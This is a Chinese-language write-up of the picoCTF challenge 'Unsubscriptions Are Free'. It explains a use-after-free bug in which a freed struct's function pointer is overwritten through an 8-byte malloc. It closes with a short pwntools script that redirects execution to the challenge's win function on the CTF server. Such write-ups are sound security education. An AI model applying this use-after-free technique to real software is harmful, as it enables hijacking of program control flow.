# Unsubscriptions Are Free 10
>Check out my new video-game and spaghetti-eating streaming channel on Twixer! program and get a flag. vuln.c  
nc mercury.picoctf.net 6312

# Vuln
在cmd结构体中定义了user的首地址的值是要执行的函数指针，首地址+4是指向username地址的指针。
```cpp
typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}

cmd *user;
```
注销账户时会将user free掉，但是没将被free的指针置null
```cpp
void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}
```
leaveMessage会使用堆上可分配的最前8个字节
```cpp
void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}
```
且leaveMessage不会改写user的函数指针whatToDo，会不检测user是否未被初始化/释放就会尝试直接执行user的whatToDo  
注释提示了这点易受攻击
```cpp
int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}
```

# PWN!
注销用户释放user -> 用leaveMessage向原先属于(user->whatToDo)的地址写入目标函数hahaexploitgobrrr()的地址 -> 程序执行hahaexploitgobrrr()
```python
```
from pwn import *
p=remote('mercury.picoctf.net',6312)

p.sendline('i')
p.sendline('y')
p.sendline('l')
p.recvuntil("try anyways:")
p.sendline(p32(0x80487d6))
p.interactive()
```